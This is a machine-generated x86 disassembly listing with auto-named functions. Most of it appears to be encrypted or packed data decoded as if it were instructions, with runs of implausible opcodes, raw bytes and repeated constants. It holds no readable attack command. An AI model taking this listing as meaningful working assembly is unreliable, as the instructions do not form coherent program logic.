mov ebx 0x7bafb9b9
insd
inc esi
inc esi
push ss
scasd [ edi ]
sub eax 0xc546464c
and ah [ edx + 0x56 ]
inc esi

sub_471158
retn
sub_471159
xchg edx eax
mov ebx 0x1516b9b9
mov ecx 0xfbcf5210
xchg edx eax
mov ebx 0x86c3b9b9
dec ecx
retn
sub_4711da
mov ecx 0x4bcaafb9
inc esi
inc esi
salc
iretd
sub_471257
retn 0xfa62
sub_47131f
inc [ ebp + 0x46 ]
inc esi
int 0x91
scasd [ edi ]
and dl [ ecx + edi * 4 - 0x3c342947 ]
cmp [ edx - 0x50e94647 ] 0x50
push edx
inc esi
inc esi
salc
salc

sub_47133a
retn
sub_47133b
xchg edx eax
mov ebx 0x1516b9b9
iretd
sub_471369
add ah [ edx + 0x6e ]
inc esi
jbe r-xdata

inc esi
inc ebp
xchg [ esi ] dl
sub al 0x46
mov ecx 0x4646c6d0
inc esi
int 0xbe
retn
sub_4713b7
retn
sub_4713b9
mov ebx 0xcb16b9b9
retn
sub_471409
add ebp [ esi + 0x20282c1e ]
iretd
sub_47145e
add ebp [ esi + ebx - 0x30dfd0d4 ]
add ebp [ edx + 0x20302c1e ]
iretd
sub_47146c
add ebp [ eax + 0x669caf1e ]
inc esi
inc esi
salc
salc
salc
dec ecx
retn
sub_471479
mov edi 0x2cb9b9ba
sub [ esi ] ebx
sub al 0x36
and bh cl
add edx [ esi + 0x20232c1e ]
iretd
sub_4714d0
dec ecx
retn
sub_47165e
mov ecx 0xd6d6d6b9
mov ecx 0x86c31211
dec ecx
retn 0x61ed
sub_47166c
inc esi
inc esi
scasd [ edi ]
sub al [ eax + 0x46 ]
inc esi
salc
adc eax 0xae50ae16
mov ecx 0x4a82c5b9
sub al 0x56

sub_471681
add ebx [ edx + 0x41ae1615 ]
scasb [ edi ]
mov ecx 0xb7b9afb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
iretd
sub_47169a
into
test [ esi + 0x46 ] 0x46
mov ecx 0xd1b9ae33
retn 0x4646
sub_4716bf
dec eax
inc esi
inc esi
inc esi
lds eax [ esp + eax * 2 + 0x577ac520 ]
inc esi
dec ecx
retn
sub_4716cd
mov eax 0x20464658
lds edi [ esi + eax * 2 + 0x49 ]
retn 0xbaba
sub_4716d9
mov ecx 0x4486c5b9
scasd [ edi ]
push esi
pop esp
inc esi
inc esi
int 0x5d
inc ebp
xchg edi eax
iretd
sub_4716e8
sbb dh [ esi + 0x4d ]
and [ ebp - 0x69 ] bh
dec ecx
retn
sub_4716f0
in al 0x9a
mov ecx 0xbe1bcdb9
dec ecx
int1
add edx [ esi - 0x51 ]
push eax
mov bh 0xb9
mov ecx 0xc349816d
0x6db9b9b8 0xc2b7
xchg esp eax
dec ecx
retn 0xb894
sub_471729
0x4642
sub_4717e2
cmc
xchg ebx eax
mov ecx 0x5baf10b9
xchg ebx eax
mov ecx 0x20b8cdb9
iretd
sub_4719e3
push esi

sub_4719e5
add edx [ esi - 0x52d850f0 ]
mov ecx 0x8603cbb9
push ss
sub al 0x47
adc [ eax * 2 + 0xdf8f62e ] ch
0xf1b9
sub_471a5a
add [ ebp - 0x46ea4647 ] ebx
push ebx
0xaf464646 0x5e15
sub_471abc
add edx [ edx + 0x410daf16 ]
inc esi
inc esi
int 0x80
scasb [ edi ]
add ecx [ edx - 0x50e04647 ]
or [ ecx - 0x69514647 ] ebp
dec eax
inc esi
inc esi
lds eax [ edx + 0x6202cf56 ]
retn
sub_471bb0
inc esi
inc esi
scasd [ edi ]
0xd6464645 0xd6d6
sub_471be6
add edi [ esi - 0x517f32ea ]
lea di [ ecx - 0x793ce047 ]
dec ecx
retn 0x464c
sub_471c5d
or edi [ esi - 0x504dec31 ]
les ecx [ edx - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_471c72
add ah [ edx + 0x66 ]
retn
sub_471d98
mov bl 0x11
iretd
sub_471d9b
rcl dl 0x46
inc esi
inc esi
scasb [ edi ]
mov al [ 0x2eb9b9a3 ]
pop ebp
xchg edx eax
push ss
and al 0x11
iretd
sub_471dd1
shr dl 0x46
inc esi
inc esi
scasd [ edi ]
push esi
stosd [ edi ]
mov ecx 0xae11d6b9
push ds
push ebp
inc esi
inc esi
retn
sub_471ffb
xchg [ ecx - 0x3d ] cl
hlt
sub_472026
add esp [ esi + 0x41ebaf16 ]
inc esi
inc esi
salc
and bh cl
cmp eax [ edi + ebp * 4 - 0x46464e6e ]
salc
dec ecx
retn 0x5438
sub_472047
mov ecx 0x7fb9b9a1
cmp ah [ edx + 0x76 ]
scasd [ edi ]
mov dh 0xa1
mov ecx 0xd6d6d6b9
salc
scasb [ edi ]
test [ edi - 0x7d3a4647 ] edi
push edx
retn
sub_4720a4
cmp ebx [ eax - 0x3d504733 ]
inc ebp
inc esi
inc esi
push ds
sub al 0x28
and bh cl
add ebx [ edx - 0x33 ]
test [ eax ] ah
iretd
sub_4720e4
iretd
sub_4720e5
sbb edx [ esi - 0x51 ]
leave
inc ecx
inc esi
inc esi
salc
salc
salc
scasd [ edi ]
int3
sub_47216a
push edi
adc [ edi + 0x46465653 ] ch

sub_472172
adc ebx [ edx - 0x46650d52 ]
mov ecx 0xb9b139af
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc

sub_472188
retn 0xd262
sub_47218b
inc esi
inc esi
inc esi
push ss
sub al 0x46
mov ecx 0x86c30a10
dec ecx
retn 0x4667
sub_47219a
inc esi
inc esi

sub_4721c4

sub_4721db
mov ebx 0xc3cbb9b9
0xaeb9b9b0 0x5370
sub_47220c
mov ecx 0x30b9d6b9
push ss
iretd
sub_472252
add ah [ edx + 0x52 ]
dec ecx
retn 0x85bb
sub_4722ee
push esi
scasd [ edi ]
adc dl [ ebx + 0x46 ]
inc esi

sub_4722f5
retn
sub_47231c
xchg [ ecx - 0x3e ] cl
xor [ edx + 0x46 ] eax
inc esi

sub_472324
adc [ eax - 0x35 ] eax
retn 0xd662
sub_47232a
inc esi
inc esi
inc esi
scasd [ edi ]
in eax 0x95
mov ecx 0xd6d6d6b9
iretd
sub_4723d5
xchg bl cl
retn
sub_4723d8
cli
mov esp 0x15afb9b9
mov [ 0xffffffffd6d6b9b9 ] eax
salc
salc
salc

sub_4723e7
retn
sub_4723e8
cli
mov esp 0xb916b9b9
adc [ edx - 0x35 ] ch
retn
sub_472454
adc edi ecx
add [ esi ] ah
scasb [ edi ]
push 0x2eb9b999
cmp dl [ edi ]
and [ ecx + edx ] ebp
iretd
sub_472464
add [ edx ] ah
scasb [ edi ]
cwd
mov ecx 0x47ad2eb9
psrld mm2 [ ecx ]
iretd
sub_472472
add [ esi ] ch
scasb [ edi ]
push esp
cdq
mov ecx 0xd4962eb9
mov dh 0xc1
scasd [ edi ]
out dx al
mov esi 0x86c3b9b9
dec ecx
retn 0x4f9d
sub_472489
inc esi
inc esi
sub al 0x2

sub_47248e
add ebp esi
adc eax 0x9fbcae16
mov ecx 0xaf562cb9
cmp esi [ ebp - 0x39294647 ]
inc esp
inc esi
scasd [ edi ]
and esp [ edi - 0x29294647 ]
salc
salc
dec ecx
retn
sub_47254b
xchg [ ecx - 0x3e ] cl
inc edx
inc esi
inc esi
inc esi
iretd
sub_472646
sbb al 0x96
lds edi [ ebp + 0x4066af4f ]
inc esi
inc esi
salc

sub_472652
retn
sub_472653
cmp bh [ ebx - 0x50e94647 ]
sbb [ edx - 0x29294647 ] 0xd6d6d6d6
salc
salc
adc [ eax ] dl

sub_472668
retn
sub_47269c
popfd
dec ecx
retn 0x8e7c
sub_4726a1
mov ecx 0xbeb7afb9
mov ecx 0x82c5d6b9
push edx
retn
sub_4726ad
xchg [ ecx - 0x3e ] cl
and edx [ ecx + 0x46 ]
inc esi
inc esi
push esi
inc esi
inc esi

sub_4726ba
add ecx [ esi - 0x4646d3ea ]
xor esi [ esi + 0x118e1bcf ]
scasd [ edi ]

sub_4726d6
dec esi
inc esp
inc esi
inc esi

sub_4726db
retn
sub_47274e
retn
sub_47274f
cli
mov esp 0xae16b9b9
mov dh 0x83
mov ecx 0x8effafb9
mov ecx 0xd6d6d6b9
salc
sub al 0x28
and bh cl
add edx [ edx + 0x20322c1e ]
iretd
sub_47276d
add edx [ eax - 0x30df798b ]
add ebx [ esi + 0x202b2c1e ]
iretd
sub_47277a
add ebx [ edx - 0x50c9d3e2 ]
mov dh 0x54
inc esi
inc esi
salc
retn
sub_4727dc
retn
sub_4727dd
xor bh [ ebp - 0x46e94647 ]
shr [ esi - 0x3ab9b9ba ] 0x1
cmp [ esi - 0x35 ] 0x3
xchg esi eax
push ss

sub_472824
add ebx [ edx - 0x46519151 ]
mov ecx 0xd6d6d6d6
iretd
sub_4728d8
inc esi
inc esi
stc
or [ edx ] dh
inc esi
inc esi
and [ ebp - 0x77 ] bh
dec ecx
retn
sub_47290d
mov [ 0x19b9b9b9 ] eax
int 0x80
sbb [ ebp - 0x213cb62a ] al
dec edi
inc esi
inc esi
mov ecx 0xaf566202
retn 0x464f
sub_4729da
retn 0xde62
sub_4729dd
inc esi
inc esi
inc esi
push ss
scasb [ edi ]
and eax 0xafb9b985
lodsb [ esi ]
popfd
mov ecx 0x8fc3d6b9
dec ecx
retn 0xaca4
sub_472a20
push 0x44
inc esi
inc esi
sub al 0x7c
push ds
sub al 0x1c
and bh cl
add ebx [ edx + 0x20292c1e ]
iretd
sub_472a32
add ebx [ eax + 0x20282c1e ]
iretd
sub_472a39
add esp [ esi + 0x20232c1e ]
iretd
sub_472a40
add esp [ esi + ebx - 0x30dff0d4 ]
add esp [ edx + 0x20222c1e ]
iretd
sub_472a59
salc
salc
mov ecx 0x4646c6d0
inc esi
int 0xb6
retn
sub_472a64
mov al 0x49
retn 0x8d5e
sub_472a69
mov ecx 0x5603cdb9
iretd
sub_472a6f
pop esi
adc eax 0xae81cd10
0x1fb9b9b1 0xcd1f
sub_472b0a
dec ebx
inc esi
inc esi
inc esi
scasb [ edi ]
stc
test [ ecx + 0x4986c3b9 ] bh
retn 0xbe58
sub_472b67
0x10464642 0xcd11
sub_472b6e
mov esi 0x4647422e
inc esi

sub_472b75
retn
sub_472b99
mov ecx 0x464dc6ae
inc esi

sub_472c29
sbb esp [ eax - 0x4fc430e0 ]
and bh cl
adc ebx [ edx ]
sub al 0x2f
sbb al 0x2c
sub [ eax ] ah
iretd
sub_472c81
or edx [ edx - 0x511dfc35 ]
cwde
mov dl 0xb9
mov ecx 0xc24986c3
in al 0x9e
mov ecx 0x820bcbb9

sub_472c97
add esp edx
scasb [ edi ]
lea esi [ edx - 0x793c4647 ]
dec ecx
retn 0x9ec9
sub_472ca4
mov ecx 0xf20bcbb9
scasd [ edi ]
and edi ebx
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
lds eax [ edx + 0x4986c34a ]
retn 0x571e
sub_472cbf
inc esi
inc esi
int 0x0
push ss
push ss
iretd
sub_472d34
add edi [ edx - 0x3db6793d ]
add ecx [ esi - 0xb504647 ]
mov eax 0xd6d6b9b9
salc
salc
salc
salc
salc
dec ecx
retn
sub_472d7d
sbb edi [ edx - 0x465a2451 ]
mov ecx 0xc6d0b9d6
inc esi
inc esi
inc esi
iretd
sub_472e5d
retn
sub_472eeb
retn 0xde62
sub_472f2c
xchg [ edi - 0x464605ee ] ch
scasb [ edi ]
adc dl [ edx + 0x232eb9b9 ]
mov ch 0x11
mov cl 0x11
iretd
sub_472f5e
cmp esi eax
sub al 0xb
scasd [ edi ]
fisubr [ ebx - 0x29294647 ]
salc
salc
salc
salc
salc
salc
sbb [ eax ] esp
iretd
sub_4730ac
adc ebp [ eax + 0x20 ]
iretd
sub_473237
pop esi
inc ebp
inc esi
inc esi
adc eax 0x119d7510
int 0xbe

sub_473243
retn
sub_473245
mov ebx 0x4afb9b9
stosb [ edi ]
mov ecx 0xcf201cb9
adc esp [ ebp + esi * 2 + 0x20282c94 ]
iretd
sub_4732d8
sar [ esi - 0x51b9b9ba ] 0xef
xchg esi eax
mov ecx 0x5e82c5b9
iretd
sub_4733cb
retn
sub_4733cc
mov ebx 0xa4afb9b9
mov ch 0xb9
mov ecx 0xd6d6d6d6
salc
dec ecx
retn
sub_47344d
add esp [ esi - 0x46637b51 ]
mov ecx 0x16d6d6d6
scasd [ edi ]
pop ss
movsb [ edi ] [ esi ]
mov ecx 0x86c3d6b9
dec ecx
retn 0xa636
sub_473464
mov ecx 0x702cbb9
mov eax 0xb9fda1af
mov ecx 0x8b2ed6d6
push edi
inc esp
and edx [ ecx ]
iretd
sub_4734dd
stc
mov ecx 0xaed6d6b9
pushad
mov esi 0x86c3b9b9
dec ecx
retn
sub_4734eb
inc ecx
inc esi
inc esi
inc esi
adc eax 0x46ead0b9
inc esi
inc esi
iretd
sub_4734f7
sbb ah [ edx + 0x52 ]
scasb [ edi ]
test al 0x8a
mov ecx 0x1b975b9
retn
sub_473563
add esi [ edx - 0x7f32e5d4 ]
and bh cl
add esi [ eax + 0x3cf201e ]
mov esi 0xcf208675
add edi [ esi + ebp + 0x46464742 ]

sub_47357e
retn
sub_47357f
retn 0xb9bd
sub_473582
mov ecx 0x4e03cd16
mov ecx 0x29af6216
mov [ 0xffffffffd6d6b9b9 ] eax
salc
int 0x9e
retn
sub_473595
popfd
dec ecx
retn 0xf9a1
sub_47359a
mov ecx 0xba33b9b9
adc [ ecx + 0x4646ced0 ] edi
inc esi
int 0xbe
retn
sub_4736b1
0xda62
sub_473753
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_473766
rcl [ esi ] cl
adc bl cl

sub_47376b
0xb9bb
sub_473940
mov ecx 0x9813cf20
sbb al 0x2c
xor eax 0xa613cf20
int 0x97
and bh cl
adc esp [ ebp + ecx * 8 + 0x13cf2096 ]
mov [ 0x20662c1c ] al
iretd
sub_473ab2
int 0x36
int 0x6
pop esi
inc ebp
mov edi 0xb7459f45
iretd
sub_473abf
add edi [ esi - 0x4614a051 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
and bh cl
add esi [ edx + 0x201e232c ]
iretd
sub_473ad7
add esi [ eax + 0x201e342c ]
iretd
sub_473c05
push esi
inc esi
inc esi
inc esi
retn
sub_473c5b
mov ecx 0x9959afb9
mov ecx 0x2ed6d6b9
sub eax 0x1004044c
int 0xbe
scasb [ edi ]
pop esp
cmp [ ecx + 0x5682c5b9 ] 0xb9c39ecd
dec ecx
retn 0xf419
sub_473d21
mov ecx 0xf264afb9
mov ecx 0x381d6b9
mov ch [ esi ]
aas
and eax [ ss : ecx + 0x30349603 ]
scasb [ edi ]
imul esp [ edx + 0x1819b9b9 ] 0x1d
retn
sub_473d81
dec ecx
retn
sub_473d83
cwd
mov ecx 0xb23dafb9
mov ecx 0x620acfb9
outsb

sub_473d91
0xe662
sub_473d94
inc esp
inc esi
inc esi
pop ss
push ss
scasd [ edi ]
xchg esi eax
xchg [ ecx - 0x29292947 ] edi
salc
iretd
sub_473da3
or edi [ edx - 0x46140951 ]
mov ecx 0x49d6d6d6
retn 0xbf6d
sub_473db1
mov ecx 0xba3bc5b9
inc esi
dec ecx
retn 0xbf67
sub_473dcb
lea edi [ ecx - 0x46ee2947 ]
adc [ esi ] ah
scasd [ edi ]
cld
mov cl 0xb9
mov ecx 0xc5d6d6d6
cmp ah [ edx + 0x5a ]
inc edi
dec ecx
retn
sub_473de3
mov al [ 0x3ac5b9b9 ]
bound edx [ edx + 0x47 ]
dec ecx
retn
j_sub_403a0c#2
jmp sub_403a0c
sub_473eac
pop ebp
retn
j_sub_403a0c
jmp sub_403a0c
sub_474105
pop ebp
retn
sub_474152
retn
sub_474153
jmp sub_403a0c
j_sub_474152
jmp sub_474152
sub_47415a
pop ebp
retn
sub_474296
inc edx
add al cl
retn
